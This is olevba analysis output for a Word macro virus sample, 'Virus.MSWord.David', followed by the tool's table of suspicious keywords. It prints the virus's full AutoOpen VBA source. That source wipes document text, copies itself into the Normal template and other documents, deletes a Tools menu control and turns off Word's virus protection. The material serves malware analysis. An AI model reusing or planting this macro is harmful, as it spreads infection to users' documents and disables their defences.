olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.David
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.David - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.David - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Main()
Attribute Main.VB_Description = "Ìàêðîñ çàïèñàí 01.11.00 Äàâûäîâ Ä.Â."
Attribute Main.VB_ProcData.VB_Invoke_Func = "Normal.NewMacros.Ìàêðîñ1"
'
' Ìàêðîñ1 Ìàêðîñ
' Ìàêðîñ çàïèñàí 01.11.00
'
    
   ' t = InputBox("?")
   Pat$ = Options.DefaultFilePath(Path:=wdToolsPath) & "\Doc1.doc"
    If Dir(Pat$) = "Doc1.doc" Then a = 1 Else a = 0
    If ActiveDocument.VBProject.VBComponents.Count <= 1 Then b = 0 Else b = 10
    c = a + b
          
    Select Case c
    Case 10
        Application.ScreenUpdating = False
        ad$ = ActiveDocument.FullName
        Selection.WholeStory
        Selection.Delete Unit:=wdCharacter, Count:=1
        ActiveDocument.SaveAs FileName:= _
        Pat$, FileFormat:=wdFormatDocument, LockComments:=False, Password:="", _
        AddToRecentFiles:=False, WritePassword:="", ReadOnlyRecommended:=False, _
        EmbedTrueTypeFonts:=False, SaveNativePictureFormat:=False, SaveFormsData _
        :=False, SaveAsAOCELetter:=False
        
        
        Documents.Open ad$
        Application.OrganizerCopy Source:= _
        ad$, Destination:= _
        NormalTemplate.FullName, Name:="AutoOpen", Object:=wdOrganizerObjectProjectItems
        Documents("Doc1.doc").Close SaveChanges:=wdSaveChanges
        Application.ScreenUpdating = True
    Case 1
        ad$ = ActiveDocument.FullName
        Application.OrganizerCopy Source:= _
        Pat$, Destination:= _
        ad$, Name:="AutoOpen", _
        Object:=wdOrganizerObjectProjectItems
        CommandBars("Tools").Controls(12).Delete
        Options.VirusProtection = False
        ActiveDocument.Save
    End Select
   
End Sub
 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

